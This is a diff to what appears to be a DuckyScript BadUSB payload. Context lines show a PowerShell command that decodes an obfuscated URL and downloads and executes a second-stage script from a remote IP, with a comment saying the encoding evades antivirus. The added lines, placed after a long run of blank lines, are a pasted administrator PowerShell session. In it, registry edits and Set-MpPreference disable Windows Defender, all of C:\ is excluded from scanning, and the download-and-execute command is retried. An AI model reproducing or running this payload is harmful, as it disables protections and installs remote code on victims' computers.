@@ -81,3 +81,87 @@ DELAY 500
 REM ── Step 14: Pull stage2.ps1 encoded to bypass AV string detection ──
 STRINGLN powershell -c "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE1My43NS44Mi4xOTgvc3RhZ2UyLnBzMQ=='));IEX (New-Object Net.WebClient).DownloadString($u)"
 DELAY 1000
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\WINDOWS\system32> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+The operation completed successfully.
+PS C:\WINDOWS\system32> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+The operation completed successfully.
+PS C:\WINDOWS\system32> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+The operation completed successfully.
+PS C:\WINDOWS\system32> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+The operation completed successfully.
+PS C:\WINDOWS\system32> Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -MAPSReporting 0
+PS C:\WINDOWS\system32> Stop-Service WinDefend -Force
+Stop-Service : Service 'Microsoft Defender Antivirus Service (WinDefend)' cannot be stopped due to the following
+error: Cannot open WinDefend service on computer '.'.
+At line:1 char:1
++ Stop-Service WinDefend -Force
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : CloseError: (System.ServiceProcess.ServiceController:ServiceController) [Stop-Service],
+   ServiceCommandException
+    + FullyQualifiedErrorId : CouldNotStopService,Microsoft.PowerShell.Commands.StopServiceCommand
+
+PS C:\WINDOWS\system32> Add-MpPreference -ExclusionPath 'C:\'
+PS C:\WINDOWS\system32> powershell -c "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE1My43NS44Mi4xOTgvc3RhZ2UyLnBzMQ=='));IEX (New-Object Net.WebClient).DownloadString($u)"
+=[System.Text.Encoding]::UTF8.GetString : The term '=[System.Text.Encoding]::UTF8.GetString' is not recognized as the
+name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was
+included, verify that the path is correct and try again.
+At line:1 char:1
++ =[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64S ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (=[System.Text.Encoding]::UTF8.GetString:String) [], CommandNotFoundExce
+   ption
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+Cannot find an overload for "DownloadString" and the argument count: "0".
+At line:1 char:125
++ ... gvc3RhZ2UyLnBzMQ=='));IEX (New-Object Net.WebClient).DownloadString()
++                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodException
+    + FullyQualifiedErrorId : MethodCountCouldNotFindBest
+
+PS C:\WINDOWS\system32>
